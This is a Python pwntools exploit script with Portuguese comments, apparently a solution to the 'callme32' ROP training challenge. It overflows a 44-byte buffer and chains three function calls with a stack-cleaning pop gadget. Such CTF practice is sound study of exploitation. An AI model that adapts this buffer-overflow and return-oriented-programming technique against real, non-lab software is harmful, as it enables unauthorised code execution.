#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *

elf = elf.context = ELF('callme32')
p = process(elf.path)

### EXPLAINED ###
'''
Como não faço muitos exploits usando ROP Chain (perceba, quando me refiro-me à ROP Chain quero dizer rop.chain() função do pwn e não a cadeia de ROPs em si)
Irei começar a fazer alguns exploits usando rop chain
Precisamos colocar na stack os nossos parâmetros, porém não vamos conseguir passar eles na stack e chamar a outra função diretamente
Não conseguimos, pois os argumentos na arquitetura x32 são passados via stack (podemos usar outras calling conventions porém essa é a mais usada)
Enfim, se não tirarmos os argumentos eles ficarão perdidos na nossa stack e isso causaria um problema

Precisamos antes retirar esses argumentos anteriores da pilha, por isso utilizamos o gadget, o gadget será nosso endereço de retorno
Para resolvir isso qualquer gadget que dê um pop em nossos argumentos serve
Eu usei o pop esi ; pop edi ; pop ebp ; ret
Porque ele faz um pop em 3 endereços, e temos 3 parâmetros
Mas deixei comentado outro gadget um pouco diferente que efetua um pop em registradores de ordem diferente porém também funciona
Mas vale lembrar que como são 4 pop's devemos passar 4 parâmetros

O que vamos fazer:
1 - Estourar o buffer
2 - Chamar a função
3 - Passar o endereço de retorno como sendo o gadget para efeturar a limpeza da stack
4 - Passar os parâmetros que serão usados pela função e depois serão colocados os registradores de acordo com o gadget, limpando assim a nossa stack e preparando ele paraa próxima chamada de função
'''

# 0x080484e0    1 6            sym.imp.callme_three
# 0x080484f0    1 6            sym.imp.callme_one
# 0x08048550    1 6            sym.imp.callme_two
# 0x080487f9 : pop esi ; pop edi ; pop ebp ; ret

gadget = p32(0x080487f9)
# gadget = p32(0x080487f8) # pop ebx ; pop rsi ; pop edi ; pop ebp ; ret
# o gadget acima é utilizavél também, coloquei ele ali para mostrar que o gadget serve apenas para limpar os argumentos

callme_one = p32(0x080484f0)
callme_two = p32(0x08048550)
callme_three = p32(0x080484e0)

param = gadget
param += p32(0xdeadbeef)
param += p32(0xcafebabe)
param += p32(0xd00df00d)
#param += b'A' * 4 # esse é o 4º parâmetro se você ustilizar o gadget que começa com pop ebx

xpl = b''
xpl += b'A' * 44

xpl += callme_one
xpl += param

xpl += callme_two
xpl += param

xpl += callme_three
xpl += param

with open('payload', 'wb') as file:
	file.write(xpl)

p.sendline(xpl)
p.interactive()
